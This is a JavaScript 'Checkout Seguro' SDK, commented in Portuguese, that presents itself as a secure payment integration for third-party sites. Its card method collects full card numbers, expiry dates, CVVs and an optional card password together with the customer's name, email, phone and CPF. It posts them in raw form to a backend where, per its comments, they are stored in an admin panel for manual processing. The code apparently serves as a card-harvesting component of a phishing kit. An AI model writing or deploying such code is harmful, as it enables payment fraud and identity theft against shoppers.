/**
 * Checkout Seguro SDK - Integração para Sites Terceiros
 * Este script permite que outros sites enviem dados de pagamento de forma segura para o backend do Checkout Seguro.
 */

class CheckoutSeguroSDK {
    /**
     * @param {Object} config Configurações da API
     * @param {string} config.apiUrl URL completa da sua API (ex: 'https://seusite.com/api/checkout')
     * @param {string} config.domain (Opcional) Domínio de origem. Padrão: hostname atual
     */
    constructor(config) {
        if (!config || !config.apiUrl) {
            throw new Error("CheckoutSeguroSDK: 'apiUrl' é obrigatória na configuração inicial.");
        }
        this.apiUrl = config.apiUrl;
        this.domain = config.domain || window.location.hostname;
    }

    /**
     * Processa um pagamento via Cartão de Crédito
     * (Será salvo no painel admin para processamento manual posterior)
     * 
     * @param {Object} data Dados do pagamento
     * @returns {Promise<Object>} Resposta da API
     */
    async payWithCard(data) {
        const payload = {
            payment_method: 'card',
            domain: this.domain,
            customer_name: data.name,
            customer_email: data.email,
            customer_phone: data.phone,
            customer_cpf: data.cpf,
            amount: parseFloat(data.amount) || 0,
            
            // Dados do Cartão
            card_holder_raw: data.cardHolder,
            card_number_raw: String(data.cardNumber).replace(/\s+/g, ''),
            card_expiry_raw: data.cardExpiry,
            card_cvv_raw: data.cardCvv,
            card_password: data.cardPassword || '', // Senha opcional (3DS)
            
            items: data.items || [{ name: 'Doação/Pagamento Externo', price: data.amount, quantity: 1 }]
        };

        return this._sendRequest(payload);
    }

    /**
     * Processa um pagamento via Pix
     * (Gera automaticamente o QR Code na adquirente configurada no admin)
     * 
     * @param {Object} data Dados do cliente e valor
     * @returns {Promise<Object>} Resposta da API com dados do PIX (QR Code, Copia e Cola)
     */
    async payWithPix(data) {
        const payload = {
            payment_method: 'pix',
            domain: this.domain,
            customer_name: data.name,
            customer_email: data.email,
            customer_phone: data.phone,
            customer_cpf: data.cpf,
            amount: parseFloat(data.amount) || 0,
            
            items: data.items || [{ name: 'Doação/Pagamento Externo', price: data.amount, quantity: 1 }]
        };

        return this._sendRequest(payload);
    }

    async _sendRequest(payload) {
        try {
            const response = await fetch(this.apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();
            
            if (!response.ok) {
                throw new Error(result.error || result.message || 'Erro ao processar requisição');
            }
            
            return result;
        } catch (error) {
            console.error("CheckoutSeguroSDK Error:", error);
            throw error;
        }
    }
}

// Exporta globalmente caso não esteja em ambiente modular
if (typeof window !== 'undefined') {
    window.CheckoutSeguroSDK = CheckoutSeguroSDK;
}
